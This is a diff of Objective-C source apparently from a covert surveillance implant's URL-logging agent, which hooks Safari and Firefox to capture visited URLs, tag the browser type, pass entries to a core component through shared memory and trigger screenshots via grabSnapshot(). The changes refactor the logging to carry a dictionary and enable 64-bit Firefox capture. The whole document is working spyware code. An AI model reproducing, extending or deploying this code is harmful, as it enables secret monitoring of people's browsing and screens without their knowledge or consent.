@@ -314,20 +314,22 @@ void URLStartAgent()
 
 @interface myLoggingObject : NSObject
 
-- (void)logURL: (NSString *)URL;
+- (void)logURL: (NSDictionary *)aDict;
 
 @end
 
 @implementation myLoggingObject
 
-- (void)logURL: (NSString *)URL
+- (void)logURL: (NSDictionary *)aDict
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   NSTimeInterval interval;
   
-  if (URL == nil)
+  if (aDict == nil)
     return;
     
+  NSString *URL = (NSString*)[aDict objectForKey: @"url"];
+  
   if (gURLDate == nil)
     {
       gURLDate = [[NSDate date] retain];
@@ -447,7 +449,7 @@ void URLStartAgent()
                   length: sizeof(short)];
   
   // Browser Type
-  int browserType = BROWSER_SAFARI;
+  int browserType = [[aDict objectForKey: @"agent"] intValue];
   
   [entryData appendBytes: &browserType
                   length: sizeof(browserType)];
@@ -541,6 +543,8 @@ void URLStartAgent()
 
       grabSnapshot();
     }
+  
+  [aDict release];
 }
 
 @end
@@ -554,15 +558,25 @@ void URLStartAgent()
 #ifdef DEBUG_URL
   infoLog(@"");
 #endif
-
+  
+  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
   NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
+  
   myLoggingObject *logObject = [[myLoggingObject alloc] init];
+  
+#ifdef DEBUG_URL     
+  NSLog(@"get _url: %@", _url);
+#endif
+  
+  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
+                           _agent, @"agent", nil];
   
   [NSThread detachNewThreadSelector: @selector(logURL:)
                            toTarget: logObject
-                         withObject: _url];
+                         withObject: urlDict];
   
   [logObject release];
+  [_agent release];
   [_url release];
 }
 
@@ -622,7 +636,7 @@ extern char *get_url64();
   [self setTitleHook: (title)];
   
 // Disable for 32bit browser
-#ifdef __i386__
+#ifdef __x86_64__
 
 #ifdef DEBUG_URL
   infoLog(@"firefox setTitle: '%@'", title);
@@ -647,29 +661,25 @@ extern char *get_url64();
 #ifdef DEBUG_URL
   infoLog(@"firefox url: %s", ff_url);
 #endif
-  
-  NSData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
-  
-  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
-  shMemoryHeader->agentID = AGENT_URL;
-  shMemoryHeader->direction = D_TO_CORE;
-  shMemoryHeader->commandDataSize = MAX(strlen(ff_url), MAX_COMMAND_DATA_SIZE);
-  strncpy(shMemoryHeader->commandData, ff_url , shMemoryHeader->commandDataSize);
-  
-  if ([mSharedMemoryLogging writeMemory: logData 
-                                 offset: OFFT_URL 
-                          fromComponent: COMP_AGENT] == TRUE)
-    {
-#ifdef DEBUG_URL
-      infoLog(@"Firefox Logged!");
-#endif
-    }
-  else
-#ifdef DEBUG_URL
-    infoLog(@"Error while logging url to shared memory");
+
+  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_MOZILLA];
+  NSString *_url = [[NSString alloc] initWithCString: ff_url encoding: NSUTF8StringEncoding];
+
+  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
+                           _agent, @"agent", nil];
+#ifdef DEBUG_URL     
+  NSLog(@"get urlDict: %@", urlDict);
 #endif
   
-  [logData release]; 
+  myLoggingObject *logObject = [[myLoggingObject alloc] init];
+  
+  [NSThread detachNewThreadSelector: @selector(logURL:)
+                           toTarget: logObject
+                         withObject: urlDict];
+  
+  [logObject release];
+  [_agent release];
+  [_url release];
 
 #endif
 }
